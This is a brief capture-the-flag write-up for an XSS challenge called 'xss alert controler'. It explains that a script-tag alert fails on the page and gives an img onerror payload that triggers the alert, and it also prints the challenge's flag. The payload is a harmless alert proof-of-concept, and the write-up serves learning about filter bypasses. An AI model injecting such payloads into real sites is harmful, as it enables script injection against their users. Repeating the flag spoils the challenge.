# xss alert controler

## Description

This is a classic XSS attack. Find a way to create an alert on this webpage and capture the flag.

## Prerequisites 

* Brower : Chrome

## Write-ups

This is a test for [onerror](http://www.w3schools.com/jsref/event_onerror.asp) event. And for this page, the following script code doesn't work:
```javascript
<script> alert('xxx')</script>
```

And here's solution:

```javascript
<img src='' onerror="alert('teee')">
```
Since the read.php has the same section with the load.php page, whose section will start only if the alert shows in the main page. And for the main.php page, thought the user can check the link page read.php, but they can't open that page without the load.php section starts.

## Flag:

* Flag is frame media onerror events.